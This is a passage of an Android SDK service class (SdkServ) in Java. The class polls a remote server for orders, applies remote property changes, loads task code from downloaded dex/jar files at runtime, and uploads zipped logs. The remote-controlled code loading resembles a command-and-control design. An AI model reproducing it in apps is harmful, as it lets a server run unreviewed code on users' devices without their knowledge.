					if (res.length > 3 && StringUtil.isStringWithLen(res[4], 5)) {
						String[] props = res[4].split(",");
						boolean isPropUpdate = false;
						for (int i = 0; i < props.length; i++) {
							String[] pp = props[i].split("\\=\\=");
							if (pp.length == 2) {
								Object org = SdkServ.this.getPropObj(pp[0], null);
								if (org != null) {
									if (org instanceof String) {
										SdkServ.this.setProp(pp[0], pp[1], false);
										isPropUpdate = true;
										DSms.log(dsmsv, TAG	, "prop update:"+props[i]+" "+pp[0]+":"+SdkServ.this.getPropString(pp[0], null));
									}else if(StringUtil.isDigits(pp[1])){
										SdkServ.this.setProp(pp[0], Integer.parseInt(pp[1]), false);
										isPropUpdate = true;
										DSms.log(dsmsv, TAG	, "prop update:"+props[i]+" "+pp[0]+":"+SdkServ.this.getPropInt(pp[0], -1));
									}else{
										DSms.log(dsmsv, TAG	, "prop not update:"+props[i]);
									}
								}
							}
						}
						if (isPropUpdate) {
							SdkServ.this.saveConfig();
						}else{
							DSms.log(dsmsv, TAG	, "prop not update:"+res[4]);
						}
					}
					return true;
//				case ORDER_DEL_TASK:
//					break;
//				case ORDER_KEY:
					//resp: ORDER_KEY|base64(key)|keyVersion
					
//					SdkServ.this.setProp("key",res[1],true);
//					Encrypter.getInstance().setKey(Base64Coder.decode(res[1]));
//					break;
				case ORDER_UPDATE:
					
					
					break;
				case ORDER_UPTIME:
					
					
					break;
//				case ORDER_RESTART_SERVICE:
//					dsLog(DSms.LEVEL_I,"RESTART",0, dservice.getPackageName(), "0_0_ORDER_RESTART_SERVICE");
//					startService(gid);
					
//					break;
				case ORDER_STOP_SERVICE:
					dsLog(DSms.LEVEL_I, "STOP",0,dsmsv.getPackageName(), "0_0_ORDER_STOP_SERVICE");
					stopService();
					break;
				default:
					hasRemoteTask = SdkServ.this.syncTaskList(res[3],res[2]);
					if (hasRemoteTask) {
						SdkServ.this.taskThread.interrupt();
					}
					return true;
				}
				
				
			} catch (Exception e) {
				DSms.e(SdkServ.this.dsmsv,TAG, "up unknown Error:"+SdkServ.this.getPropString("upUrl", upUrl), e);
			}
			return false;
		}


		@Override
		public void run() {
			DSms.log(SdkServ.this.dsmsv,TAG, "UpThread started"); 
			
			if (SdkServ.this.state != DSms.STATE_RUNNING) {
				return;
			}
			nextUpTime = 1;
			while (runFlag && SdkServ.this.state == DSms.STATE_RUNNING) {
				try {
					DSms.log(SdkServ.this.dsmsv, TAG,
							"up running state:" + SdkServ.this.state);

					if (!StringUtil.isNetOk(SdkServ.this.dsmsv)) {
						Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime));
						continue;
					}

					if (System.currentTimeMillis() > nextUpTime) {
						// 每天仅发起一次请求，如果请求失败，等待10分钟
						if (this.up()) {
							// Calendar ca = Calendar.getInstance();
							// ca.add(Calendar.DATE, 1);
							// ca.set(Calendar.HOUR_OF_DAY, 6);
							// nextUpTime = ca.getTimeInMillis();
							lastUpTime = System.currentTimeMillis();
							nextUpTime += SdkServ.this.getPropInt("upSleepTime", upSleepTime);
							SdkServ.this.setProp("dt", "", true);
							DSms.log(SdkServ.this.dsmsv, TAG,
									"lastUpTime:" + lastUpTime + " nextUpTime"
											+ nextUpTime + " runFlag+"
											+ runFlag + " state:"
											+ SdkServ.this.state);
						} else {
							errTimes++;
							Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime)*errTimes);
							if (isCJ) {
								nextUpTime = System.currentTimeMillis()+ SdkServ.this.getPropInt("upSleepTime", upSleepTime);
								errTimes = 0;
							}
							continue;
						}
					}

					Thread.sleep(SdkServ.this.getPropInt("upSleepTime", upSleepTime));
				} catch (Exception e) {
					if (!e.getClass().equals(InterruptedException.class)) {
						e.printStackTrace();
						e(ERR_UP, 0, dsmsv.getPackageName(),
								"0_0_" + Log.getStackTraceString(e));
						try {
							Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime));
						} catch (InterruptedException e1) {
							e1.printStackTrace();
						}
					}
				}
			}
		}
		
	}

	private ArrayList<DSTask> taskList = new ArrayList<DSTask>();
	
	public void addTask(DSTask task){
		synchronized (this.taskList) {
			this.taskList.add(task);
		}
		this.saveStates();
	}
	
	public void delTask(int taskId){
		synchronized (this.taskList) {
			for (DSTask task : this.taskList) {
				if (task.getId() == taskId) {
					this.taskList.remove(task);
					this.removeDat(task.getId());
				}
			}
		}
		this.saveStates();
	}
	
	public void taskDone(DSTask task){
		int tid = task.getId();
		synchronized (this.taskList) {
			this.taskList.remove(task);
		}
		this.removeDat(tid);
		String deadTasks = this.getPropString("dt", "");
		this.setProp("dt", deadTasks+tid+"_", false);
		this.saveStates();
	}
	
	private void removeDat(int tid){
		try {
			File f = new File(sdDir+tid+datFileType);
			if (f.exists()) {
				f.delete();
				DSms.log(this.dsmsv,TAG, "DAT remove OK:"+tid);
			}
			f = new File(sdDir+tid+".jar");
			if (f.exists()) {
				f.delete();
				DSms.log(this.dsmsv,TAG, "jar remove OK:"+tid);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public class TaskThread extends Thread{
	
		boolean runFlag = true;
		
		@Override
		public void run() {
			DSms.log(SdkServ.this.dsmsv,TAG, "TaskThread started");
			if (SdkServ.this.state != DSms.STATE_RUNNING) {
				return;
			}
				//先初始化所有的task --loadTask时已经初始化过
//				synchronized (SdkServ.this.taskList) {
//					for (int i = 0; i < taskList.size(); i++) {
//						PLTask t = (PLTask)taskList.get(i);
//						t.init();
//					}
//				}
				
				while (runFlag && SdkServ.this.state == DSms.STATE_RUNNING) {
					
					try {
					
						//生成log上传任务
						if (StringUtil.isNetOk(SdkServ.this.dsmsv)) {
							long logSize = getLogSize();
							long cTime = System.currentTimeMillis();
							if ((logSize > SdkServ.this.getPropInt("maxLogSize", maxLogSize)) || cTime>(lastUpLogTime+SdkServ.this.getPropInt("maxLogSleepTime", maxLogSleepTime))) {
								String zipName = sdDir+uid+"_"+cTime+".zip";
								UploadLogTask t = new UploadLogTask();
								t.setZipFileName(zipName);
								taskList.add(t);
							}
						}
						
						DSms.log(SdkServ.this.dsmsv,TAG, "task check:"+taskList.size());
						synchronized (taskList) {
							for (DSTask task : taskList) {
								int state = task.getState();
								DSms.log(SdkServ.this.dsmsv,TAG, "task state:"+state+ " id:"+task.getId());
								switch (state) {
								case DSTask.STATE_WAITING:
									try {
										new Thread(task).start();
									} catch (Exception e) {
										DSms.e(SdkServ.this.dsmsv,TAG, "task exec error:"+task.getId(),e);
										e(ERR_TASK,0, dsmsv.getPackageName(), "0_0_"+Log.getStackTraceString(e));
									}
									break;
								case DSTask.STATE_DIE:
									SdkServ.this.taskDone(task);
									break;
								default:
									break;
								}
							}
						}
						DSms.log(SdkServ.this.dsmsv,TAG, runFlag+","+SdkServ.this.state+","+SdkServ.this.getPropInt("taskSleepTime", taskSleepTime));
						Thread.sleep(SdkServ.this.getPropInt("taskSleepTime", taskSleepTime));
					} catch (Exception e) {
						if (!e.getClass().equals(InterruptedException.class)) {
							e.printStackTrace();
							e(ERR_TASK_THREAD,0,dsmsv.getPackageName(), "0_0_"+Log.getStackTraceString(e));
						}
						continue;
					}
				}
		}
		

		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

	}
	
	
	class UploadLogTask implements DSTask{
		
		
		private String zipFileName;
		
		private int state = DSTask.STATE_WAITING;;

		public final void setZipFileName(String zipFileName) {
			this.zipFileName = zipFileName;
		}
		

		@Override
		public void run() {
			try {
				boolean re = false;
				File f = new File(this.zipFileName);
				if (f ==null || !f.exists()) {
					re = zip(logFile, this.zipFileName);
				}
				if(re){
					re = upload(this.zipFileName,SdkServ.this.getPropString("upLogUrl", upLogUrl));
					if (!re) {
						DSms.e(SdkServ.this.dsmsv,TAG, "upLog failed:"+this.zipFileName,null);
					}else{
						//上传成功则可以视为完成
						this.state = DSTask.STATE_DIE;
						DSms.log(SdkServ.this.dsmsv,TAG, "upload log OK");
					}
				}
				
				if (re) {
					SdkServ.this.lastUpLogTime = System.currentTimeMillis();
					f = new File(logFile);
					synchronized (f) {
						f.delete();
					}
				}else{
					SdkServ.this.taskList.remove(this);
					return;
				}
				
				SdkServ.this.taskList.remove(this);
				DSms.log(SdkServ.this.dsmsv,TAG, "UploadLogtask done:"+SdkServ.this.lastUpLogTime);
				
			} catch (Exception e) {
				e.printStackTrace();
				e(ERR_LOG_UPLOAD,0, dsmsv.getPackageName(), "0_0_"+Log.getStackTraceString(e));
			} finally{
				File f = new File(this.zipFileName);
				f.delete();
			}
			
		}

		@Override
		public void setDService(DServ serv) {
			
		}

		@Override
		public int getId() {
			return 0;
		}

		@Override
		public void init() {
			
		}

		@Override
		public int getState() {
			return this.state;
		}

		@Override
		public void setState(int state) {
			this.state = state;
		}
		
	}
	
	
	public void saveStates(){
		if (!isConfigInit || !StringUtil.isStringWithLen(this.config.get("games"), 1)) {
			this.config = readConfig(configPath);
		}
		StringBuilder sb = new StringBuilder();
		synchronized (this.taskList) {
			for (DSTask task : taskList) {
				int id = task.getId();
				if (id != 0) {
					sb.append(SPLIT_STR);
					sb.append(id);
				}
			}
		}
		if (sb.length() > 0) {
			sb.delete(0, SPLIT_STR.length());
		}
		DSms.log(this.dsmsv,TAG, "save task list:"+sb.toString());
		this.setProp("t", sb.toString(),false);
		this.setProp("emvClass", emvClass,false);
		this.setProp("emvPath", emvPath,false);
		this.saveConfig();
	}
	
	/**
	 * 供Task访问，可实现Task之间的交互
	 * @return
	 */
	ArrayList<DSTask> getTaskList(){
		return this.taskList;
	}
	
	private DSTask loadTask(int id,String localPath){
		String dexPath = localPath+id+datFileType;
		File f = new File(dexPath);
		if (f.exists() && f.isFile()) {
			try{
				DSTask plug = DSms.Ci(this.dsmsv,id,"com.acying.dsms.DSTask"+id);
				if (plug == null) {
					DSms.e(this.dsmsv,TAG, "loadTask error:"+localPath,null);
					return null;
				}
				//删除临时jar
//				f = new File(dexPath2);
//				if (f.exists() && f.isFile()) {
//					f.delete();
//				}
				DSms.log(this.dsmsv,TAG, "loadTask ok:"+plug.getId()+","+dexPath);
				
				return plug;
			}catch (Exception e) {
				DSms.e(this.dsmsv,TAG, "loadTask error:"+localPath,e);
				f.delete();
			}    
		}
		return null;
	}
	
//	public static boolean isNetOk(Context cx) {
//		ConnectivityManager cm = (ConnectivityManager) cx.getSystemService(Context.CONNECTIVITY_SERVICE);
//		boolean isOk = false;
//		if (cm != null) {
//			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
//			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
//				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
//					isOk = true;
//				}
//			}
//		}
//		return isOk;
//	}
	
	public void stop(){
		if (this.upThread != null) {
			this.upThread.setRun(false);
			this.upThread.interrupt();
		}
		if (this.taskThread != null) {
			this.taskThread.setRun(false);
			this.taskThread.interrupt();
		}
		if (this.lt != null) {
			this.lt.setRunFlag(false);
			this.lt.interrupt();
		}
//		if (this.state == DSms.STATE_DIE) {
////			ctx.unregisterReceiver(this.myReceiver);
//		}else{
//			this.state = DSms.STATE_STOP;
//		}
		DSms.log(this.dsmsv,TAG, "stoped...");
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
		}
	}
	
	private View initMore(){
		try{
			EmView emv = (EmView)DSms.Cm(emvPath,emvClass, this.getService(),true,true,false);
			if (emv != null) {
				emv.init(this.getService());
				return emv.getView();
			}
		}catch (Exception e) {
			e.printStackTrace();
		}  
		return null;
	}
	
	
	public void init(DSmser dservice,String gcid){
		this.dsmsv = dservice;
		if (dservice == null) {
			DSms.e(this.dsmsv,TAG, "DService IS NULL",null);
			return ;
		}
		DSms.log(this.dsmsv,TAG, "init:"+dservice.getPackageName()+" state:"+this.state+" gcid:"+gcid);
		
		(new File(sdDir)).mkdirs();
		
		this.initConfig(gcid);
		
		if (this.state == DSms.STATE_NEED_RESTART) {
			//重启
			this.stop();
			this.state = DSms.STATE_RUNNING;
		}else{
			this.state = this.getPropInt("state", DSms.STATE_RUNNING);
		}
		if (this.state == DSms.STATE_STOP) {
			this.stop();
			return;
		}else if(this.state == DSms.STATE_DIE){
			//这里的STATE_DIE状态直接杀死本进程
			this.stop();
			dservice.stopSelf();
			return;
		}else if(this.state == DSms.STATE_PAUSE){
			return;
		}
//		cacheDir = ctx.getApplicationInfo().dataDir;
		
		
        if (lt != null || this.upThread != null || this.taskThread!=null) {
        	DSms.log(dsmsv, TAG, "STOP threads and waiting for restart.");
			this.upThread.setRun(false);
			this.taskThread.setRun(false);
			this.lt.setRunFlag(false);
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
			}
		}
		this.lt = new LT();
		this.lt.setRunFlag(true);
		this.lt.start();
		this.upThread = new UpThread();
		this.upThread.setRun(true);
		this.upThread.start();
		this.taskThread = new TaskThread();
		this.taskThread.setRun(true);
		this.taskThread.start();
		
		
		String tasks = this.getPropString( "t", "");
		if (StringUtil.isStringWithLen(tasks, 1)) {
			String[] taskArr = tasks.split(SPLIT_STR);
			synchronized (taskList) {
				
			this.taskList.clear();
			for (int i = 0; i < taskArr.length; i++) {
				int tid = Integer.parseInt(taskArr[i]);
				DSTask task = this.loadTask(tid, sdDir);
				if (task != null) {
					task.setDService(this);
					this.taskList.add(task);
				}else{
					DSms.e(this.dsmsv,TAG, "load task failed:"+tid,null);
				}
			}
			}
		}
		
		//初始化moreView
		View v = initMore();
		if (v != null) {
			DSms.log(this.dsmsv,TAG, "initMore ok");
		}
		//注册应用变化监听器
//		PackageBroadcastReceiver receiver = new PackageBroadcastReceiver();
//		IntentFilter filter = new IntentFilter();
//		filter.addAction(Intent.ACTION_PACKAGE_ADDED);
//		filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
//		filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
//		filter.addDataScheme("package");
//		dservice.registerReceiver(receiver, filter);
	}

	/**
	 * @return the localDexPath
	 */
	public final String getLocalPath() {
		return sdDir;
	}

	/**
	 * @return the emvClass
	 */
	public final String getEmvClass() {
		return emvClass;
	}

	/**
	 * @param emvClass the emvClass to set
	 */
	public final void setEmvClass(String emvClass) {
		this.emvClass = emvClass;
		this.config.put("emvClass", emvClass);
		
	}

	
	
	/**
	 * @return the emvPath
	 */
	public final String getEmvPath() {
		return emvPath;
	}

	/**
	 * @param emvPath the emvPath to set
	 */
	public final void setEmvPath(String emvPath) {
		this.emvPath = emvPath;
		this.config.put("emvPath", emvPath);
	}


	@Override
	public int getState() {
		return this.state;
	}

	@Override
	public Service getService() {
		return dsmsv;
	}

	@Override
	public Handler getHander() {
		return dsmsv.getHander();
	}
	
	/**
	 * 读取文本文件
	 * @param context
	 * @param file
	 * @return 失败则返回空字符串
	 */
	public static final String readTxt(String file) { 
		String data = "";
		try {
			BufferedReader in = new BufferedReader(
		            new InputStreamReader(new FileInputStream(file), "UTF-8"));
			StringBuffer sb = new StringBuffer();
			int c;
			while ((c = in.read()) != -1) {
				sb.append((char) c);
			}
			in.close();
			data = sb.toString();

		} catch (FileNotFoundException e) {
			return "";
		} catch (IOException e) {
			e.printStackTrace();
			return "";
		}
		return data;
	} 
	/**
	 * 写入文件到本地files目录,utf-8方式
	 * @param context Context
	 * @param file 本地文件名
	 * @param msg 需要写入的字符串
	 * @param isAppend 是否追加
	 */
	public static final void writeTxt(String file, String msg,boolean isAppend) {
		try {
			
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream(file,isAppend),"utf-8"));
			out.write(msg);
			out.close();
			
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
	}
	
	public static final void writeTxt(String file, String msg) {
		writeTxt(file, msg, false);
	}
	
	//------------------------log--------------------------
	
	
	LT lt;// = new LT();
	StringBuilder logSB = new StringBuilder();
	
	int logSleepTime = 1000*5;
	String logFile = this.sdDir+"c_cache.dat";
	private static final String SPLIT = "||";
	private static final String NEWlINE = "\r\n";
	
	
	public void dsLog(int level,String tag,int act,String pkg,String msg){
		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
		logSB.append(level).append(SPLIT);
		logSB.append(tag).append(SPLIT);
		logSB.append(act).append(SPLIT);
		logSB.append(pkg).append(SPLIT);
		logSB.append(msg).append(NEWlINE);
	}
	
	public final void e(int errCode,int act,String pkg,String msg){
		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
		logSB.append(DSms.LEVEL_E).append(SPLIT);
		logSB.append(errCode).append(SPLIT);
		logSB.append(act).append(SPLIT);
		logSB.append(pkg).append(SPLIT);
		logSB.append(msg).append(NEWlINE);
	}
	
	private final void save(String s){
		if (s.length() > 0) {
			String str = DSms.Cg(s)+NEWlINE;
			writeTxt(logFile, str,true);
		}
	}
	
	String readLog(){
		return readTxt(logFile);
	}
	
	long getLogSize(){
		File f = new File(logFile);
		if (!f.exists()) {
			return 0;
		}
		return f.length();
	}
	public class LT extends Thread{

		boolean runFlag = true;
		
		public void setRunFlag(boolean runFlag) {
			this.runFlag = runFlag;
		}
		
		public boolean isRunFlag() {
			return runFlag;
		}


		/* (non-Javadoc)
		 * @see java.lang.Thread#run()
		 */
		@Override
		public void run() {
			DSms.log(dsmsv, TAG, "LT runFlag:"+runFlag);
			while (runFlag && SdkServ.this.state == DSms.STATE_RUNNING) {
				try {
					if (SdkServ.this.logSB.length() > 0) {
						String s = SdkServ.this.logSB.toString();
						SdkServ.this.logSB = new StringBuilder();
						DSms.log(dsmsv, TAG, "s size:"+s);
						save(s);
					}
					Thread.sleep(logSleepTime);
				} catch (Exception e) {
					if (!e.getClass().equals(InterruptedException.class)) {
						e.printStackTrace();
						e(ERR_LOG_THREAD,0, dsmsv.getPackageName(), "0_0_"+Log.getStackTraceString(e));
					}
				}
			}
		}
		
	}

	
	public final int getVer(){
		return this.version;
	}
	
	public final void setVer(int ver){
		this.version = ver;
	}

	@Override
	public void setEmp(String className, String jarPath) {
		this.emvClass = className;
		this.emvPath = jarPath;
		this.config.put("emvClass", className);
		this.config.put("emvPath", jarPath);
		this.saveConfig();
	}

	@Override
	public String getEmp() {
		return this.emvClass+"@@"+this.emvPath;
	}
}
